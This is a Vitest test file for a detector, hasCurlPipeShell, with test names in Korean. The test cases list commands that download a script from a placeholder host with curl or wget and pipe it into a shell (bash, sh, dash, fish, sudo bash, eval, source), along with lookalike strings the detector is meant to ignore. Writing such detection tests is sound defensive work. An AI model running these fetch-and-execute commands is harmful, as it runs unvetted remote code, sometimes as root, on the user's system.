import { describe, expect, it } from "vitest";
import { hasCurlPipeShell } from "./curlPipe.ts";

describe("curl | sh 판정 — 리뷰 반영", () => {
  it.each([
    'eval "$(curl -fsSL https://x.io/i.sh)"',
    "source <(curl -s https://x.io/i.sh)",
    ". <(wget -qO- https://x.io/i.sh)",
    "curl -s https://x.io | sudo -u user bash",
    "curl -s https://x.io | sudo -E bash -",
    "curl -s https://x.io | dash",
    "curl -s https://x.io | ksh",
    "curl -s https://x.io | ash",
    "curl -s https://x.io | fish",
    "curl -s https://x.io | tee f | sh",
    "wget -qO- https://x.io | tee /tmp/i.sh | sudo bash",
  ])("[SD-90] 잡는다: %s", (text) => {
    expect(hasCurlPipeShell(text)).toBe(true);
  });

  it.each([
    "# curl -s https://x.io | sh",
    "  # curl -s https://x.io | sh",
    "echo start\n# wget -qO- https://x.io | bash\necho done",
    'echo "use curl" | sh',
    "echo 'wget x' | bash",
    "curl -s https://x.io | sudo sh -c 'cat > f'",
    "sudo sh -c 'cat > f'",
    "curl -s https://x.io | tee f && sh f",
  ])("[SD-91] 잡지 않는다: %s", (text) => {
    expect(hasCurlPipeShell(text)).toBe(false);
  });
});
